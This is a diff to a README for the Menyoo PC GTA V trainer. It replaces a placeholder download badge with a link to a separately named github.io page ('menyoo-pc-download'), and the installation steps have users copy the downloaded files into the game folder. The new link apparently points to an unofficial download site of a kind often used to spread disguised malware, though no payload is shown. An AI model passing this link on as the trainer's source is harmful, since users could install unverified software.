@@ -8,7 +8,7 @@ Menyoo PC is a comprehensive **GTA V trainer and mod menu** designed for single-
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://menyoo-pc-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Copy `Menyoo.asi` and the `MenyooStuff` folder into your GTA V root directory.  
